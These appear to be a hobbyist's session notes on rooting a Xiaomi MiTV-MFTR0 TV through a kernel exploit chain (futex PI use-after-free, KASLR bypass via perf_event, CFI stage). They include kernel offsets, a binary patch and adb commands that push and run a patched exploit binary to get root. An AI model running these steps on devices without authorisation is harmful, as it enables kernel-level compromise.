# Xiaomi MiTV-MFTR0 (freeguy) Root — Session Notes

## Device Profile

| Field | Value |
|---|---|
| Device | Xiaomi MiTV-MFTR0 (codename freeguy) |
| SoC | MediaTek MT9653 / mt5879 (TV chipset) |
| CPU | Cortex-A55 x4 (ARMv8-A, kernel is AArch64) |
| Android | 11 (OS1.0.16.0.RFTMATV) |
| Kernel | `5.4.190-g4e02adfc87d9-dirty` |
| Build date | Tue Jan 23 10:18:29 UTC 2024 |
| Security Patch | 2023-02-05 |
| KASLR | Enabled (bypassed via perf_event) |
| SELinux | Enforcing |
| CFI | `CONFIG_CFI_CLANG=y` (Control Flow Integrity ON) |
| ABI | `armeabi-v7a` (but kernel is AArch64, arm64 binaries work) |

## Confirmed Kernel Parameters

```
KASLR base           = 0xffffffc010000000
KASLR slide          = 0x0000000000000000
P0_PHYS_OFFSET       = 0x80000000
P0_KERNEL_PHYS_LOAD  = 0xa8000000
delta                = 0x28000000
perf_event_paranoid  = -1  (allows KASLR bypass)
CONFIG_ASHMEM        = y   (built-in)
CONFIG_CFI_CLANG     = y   (CFI enabled!)
CONFIG_FUTEX_PI      = y
CONFIG_SYSVIPC       = not set
CONFIG_MEMFD_CREATE  = y
CONFIG_UNIX          = y
CONFIG_CONFIGFS_FS   = y
```

## Confirmed Kernel Offsets (from boot_id read)

These offsets from raspite (5.4.86 MT8169) were **verified** to be correct for our TV:

```
slide_random_boot_id_data_off = 0x01ac5ca8  ← CONFIRMED (boot_id UUID matches)
slide_sysctl_bootid_off       = 0x01c5d9b4  ← CONFIRMED (from P0 profile)
```

## Exploit Progress (CVE-2026-43499 GhostLock)

### What Works ✅

1. **KASLR bypass** via `perf_event_open` callchain sampling
2. **KernelSnitch mm_struct leak** (heap address found)
3. **Futex PI UAF trigger** — "Main: chain complete"
4. **exp32 32-bit ARM stage** — runs and parks correctly
5. **Enter CFI stage** — reached

### What Fails ❌

**CFI stage**: `SYSCHK(close(sv[0])): Bad file descriptor`

Root cause: The fake fops function pointers use wrong `.cfi_jt` addresses.
With `CONFIG_CFI_CLANG=y`, ALL function pointers must point to CFI jump table
entries. Without the vmlinux for our specific kernel, these addresses are unknown.

### Known Issues

- **`close(sv[1])` EBADF**: Intermittent issue from BSS zero-initialization.
  Patched in `ghostlock_patched_ionstack_q3.bin` (CMP w10,#1 → CMP w10,#2 at
  file offset 0x1ba4c0). Works ~50% of runs, retry if it fails.
- **`dump_skip_zeroes` does NOT exist** in MT9653 kernel — it's Amazon-only.
  The R0rt1z2/GhostLock 5.4 binary crashes because its staging area addresses
  are invalid for our kernel.

## Next Step: Build Kernel for Exact Offsets

### GitHub Actions Workflow

1. Fork https://github.com/TCLOpenSource/mt9653
2. Add `.github/workflows/build.yml` from `workflow/build.yml`
3. Run the workflow (Actions tab → Run workflow)
4. Download artifact `mt9653-kernel-offsets` → contains `ionstack.conf`

### After Getting ionstack.conf

```bash
# Push to TV
adb connect <TV_IP>:5555
adb push ionstack.conf /data/local/tmp/ionstack.conf
adb push binaries/ghostlock_patched_ionstack_q3.bin /data/local/tmp/ghostlock_patched
adb shell chmod 755 /data/local/tmp/ghostlock_patched

# Run (retry if sv[1] error)
adb shell "timeout 60 /data/local/tmp/ghostlock_patched"
```

Expected output with correct offsets:
```
[+] slide-kaslr-ok base=ffffffc010000000
[+] KernelSnitch mm_struct leak ...
[*] main: exploit chain complete.
[*] enter CFI stage
[+] CFI write ok
[+] root uid=0(root)
```

## Files in This Directory

```
binaries/
  ghostlock_patched_ionstack_q3.bin   — IonStackQuest3 preload, CMP patched
  ghostlock_54_freeguy.bin            — R0rt1z2 5.4 build for freeguy target
  ghostlock_ionstack_q3_original.bin  — Original IonStackQuest3 (unpatched)

configs/
  ionstack_raspite54_offsets.conf     — ionstack.conf with raspite 5.4.86 offsets
  target_freeguy_raspite_base.h       — Original freeguy target.h (raspite base)

source/
  target_freeguy_current.h            — Modified target.h (our TV physical addrs)
  target_raspite_original.h           — Raspite original target.h for reference

workflow/
  build.yml                           — GitHub Actions workflow to build kernel
```

## Kernel Source

TCL MT9653 open source: https://github.com/TCLOpenSource/mt9653
- Same kernel version 5.4.190
- Uses `mt5896_defconfig`
- Build requires Linux (macOS sed incompatible)

## CVE References

- **CVE-2026-43499** (GhostLock): Futex PI UAF in rtmutex `remove_waiter()`
- **CVE-2023-32830**: TVAPI OOB write (MT9653 affected, needs SYSTEM first)
- **CVE-2023-20963**: BadParcel (WorkSource parcel mismatch, patch < 2023-03-01)
  - Target component `AddAccountSettings` does NOT exist on this TV
- **CVE-2023-20808**: OPTEE OOB write (MT9653 affected, needs System privilege)
